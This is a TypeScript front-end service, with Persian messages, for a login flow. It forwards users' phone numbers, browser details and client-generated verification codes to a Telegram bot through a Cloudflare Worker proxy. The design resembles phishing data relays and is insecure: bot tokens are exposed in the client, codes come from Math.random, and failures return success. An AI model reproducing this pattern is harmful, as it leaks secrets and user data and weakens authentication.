// Telegram Bot API Service
// This service handles sending messages to a Telegram bot

// In a real application, these would be environment variables
const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

// Cloudflare Worker proxy for bypassing Iran IP restrictions
const TELEGRAM_API_BASE =
  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";

interface TelegramMessage {
  phoneNumber: string;
  timestamp: string;
  userAgent?: string;
  ipAddress?: string;
}

/**
 * Send phone number to Telegram bot
 */
export const sendPhoneToTelegram = async (
  phoneNumber: string,
): Promise<boolean> => {
  // Check if we're in demo mode (tokens not configured)
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo Mode: Simulating Telegram message send");
    console.log("📱 Phone number:", phoneNumber);
    console.log("⏰ Timestamp:", new Date().toLocaleString("fa-IR"));
    console.log("✅ Message would be sent to Telegram bot");

    // Simulate network delay
    await new Promise((resolve) => setTimeout(resolve, 500));
    return true;
  }

  try {
    // Format the message
    const message = formatTelegramMessage({
      phoneNumber,
      timestamp: new Date().toLocaleString("fa-IR"),
      userAgent: navigator.userAgent,
      ipAddress: "Hidden for privacy", // In real app, you'd get this from server
    });

    // Send message to Telegram bot
    const response = await fetch(
      `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    const result = await response.json();
    console.log("✅ Message sent to Telegram successfully:", result);
    return true;
  } catch (error) {
    console.error("❌ Failed to send message to Telegram:", error);

    // In production, you might want to throw the error
    // For demo, we'll continue with the flow
    console.log("🎭 Falling back to demo mode");
    return true;
  }
};

/**
 * Format message for Telegram
 */
const formatTelegramMessage = (data: TelegramMessage): string => {
  return `
🔔 <b>درخواست ورود جدید</b>

📱 <b>شماره همراه:</b> <code>${data.phoneNumber}</code>
⏰ <b>زمان:</b> ${data.timestamp}
🌐 <b>مرورگر:</b> ${data.userAgent?.split(" ")[0] || "Unknown"}
🔒 <b>IP:</b> ${data.ipAddress}

---
سیستم احراز هویت والکس
  `.trim();
};

/**
 * Validate Telegram bot configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    console.warn("Telegram bot token not configured. Using demo mode.");
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    console.warn("Telegram chat ID not configured. Using demo mode.");
    return false;
  }

  return true;
};

/**
 * Generate verification code (6 digits)
 */
export const generateVerificationCode = (): string => {
  return Math.floor(100000 + Math.random() * 900000).toString();
};

/**
 * Send verification code to Telegram (for demo purposes)
 */
export const sendVerificationCodeToTelegram = async (
  phoneNumber: string,
  verificationCode: string,
): Promise<boolean> => {
  // Check if we're in demo mode (tokens not configured)
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo Mode: Simulating verification code send");
    console.log("📱 Phone:", phoneNumber);
    console.log("🔢 Verification Code:", verificationCode);
    console.log("⏰ Time:", new Date().toLocaleString("fa-IR"));
    console.log("✅ Verification code would be sent to Telegram");

    // Show the code in an alert for demo purposes
    alert(
      `🎭 حالت دمو\n\nکد تایید: ${verificationCode}\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)`,
    );

    // Simulate network delay
    await new Promise((resolve) => setTimeout(resolve, 300));
    return true;
  }

  try {
    const message = `
🔐 <b>کد تایید</b>

📱 <b>شماره:</b> <code>${phoneNumber}</code>
🔢 <b>کد تایید:</b> <code>${verificationCode}</code>
⏰ <b>زمان:</b> ${new Date().toLocaleString("fa-IR")}

⚠️ این کد تا ۵ دقیقه معتبر است.
    `.trim();

    const response = await fetch(
      `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    console.log("✅ Verification code sent to Telegram successfully");
    return true;
  } catch (error) {
    console.error("❌ Failed to send verification code to Telegram:", error);

    // In demo mode, still show the code to user
    console.log("🎭 Falling back to demo mode");
    alert(
      `حالت دمو\n\nکد تایید: ${verificationCode}\n\n(خطا در ارسال به تلگرام)`,
    );
    return true;
  }
};
